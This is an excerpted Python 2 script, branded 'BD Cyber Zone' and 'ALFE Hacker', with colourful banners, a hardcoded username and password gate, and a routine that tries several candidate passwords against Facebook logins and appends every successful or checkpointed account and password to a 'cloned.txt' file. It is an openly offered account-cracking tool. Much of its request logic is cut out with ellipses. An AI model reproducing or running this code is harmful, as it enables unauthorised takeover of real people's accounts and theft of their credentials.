# BD CYBER ZONE  TEAM # ALFU VAU# HACK#!/usr/bin/python2
#coding=utf-8
...
\033[1;96m---------------------ALFE-Hacker---------------------
                
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m ROX-TAJ.                                
...
\033[1;96m------------------THE ALFE💜HACKER----------------------
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mT.J.ROX-TAJ .                                   
\033[0;91m║\033[0;91mWP No:\033[0;92m+881408479204"                                           
\033[0;95m╰════════════════════════════════════════════╯
...
\033[1;91mALFE VAU━━━❖❖BD-CYBER-ZONE(B.C.Z)❖❖━━━━🔴
\033[1;91m  ALFU VAU 
...
\033[1;96m--------------------- ALFE VAU --------------------
"""
CorrectUsername = "ALFE"
CorrectPassword = "SANNY"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://wa.me/+881408479204 ')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(ALFU-OPEN)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(ALFU-OPEN) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(ALFU-OPEN)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(ALFU-OPEN)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(LOCK-ALFU) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(LOCK-ALFU)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(CP-ALFE) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97https://www.facebook.com/Pranto.AHmeD.007
\033[1;95myoutube\033[1;97https://www.facebook.com/Pranto.AHmeD.007"""
